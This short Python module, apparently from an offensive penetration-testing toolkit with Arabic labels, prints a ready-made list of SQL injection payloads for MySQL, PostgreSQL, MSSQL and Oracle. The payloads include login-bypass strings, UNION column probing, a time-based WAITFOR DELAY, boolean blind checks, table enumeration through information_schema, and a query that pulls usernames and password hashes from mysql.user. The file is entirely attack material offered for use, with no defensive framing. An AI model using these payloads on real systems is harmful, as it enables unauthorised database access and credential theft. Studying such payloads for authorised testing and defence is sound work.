# sqli-payload.py — توليد حمولات SQLi
from core.registry import module

@module("sqli-payload", "payload", "توليد حمولات SQLi")
def run(base, a, R):
    R.good("حمولات SQLi (MySQL/PostgreSQL/MSSQL):")
    payloads = [
        ("MySQL خطأ", "' OR 1=1-- -"),
        ("MySQL رقمي", "1 OR 1=1"),
        ("MySQL UNION", "' UNION SELECT 1,2,3,4-- -"),
        ("MySQL تعليق", "1'/*"),
        ("PostgreSQL", "' OR '1'='1"),
        ("MSSQL", "1'; WAITFOR DELAY '0:0:5'--"),
        ("Oracle", "' OR 1=1--"),
        ("Blind Boolean", "1 AND (SELECT 1 FROM dual)='1'"),
        ("استخراج جدول", "' UNION SELECT table_name FROM information_schema.tables-- -"),
        ("استخراج مستخدم", "' UNION SELECT user,password FROM mysql.user-- -"),
    ]
    for name, p in payloads:
        R.info(f"  {name:<18} {p}")
    R.info("استخدم وحدة sqli للاختبار الآلي")
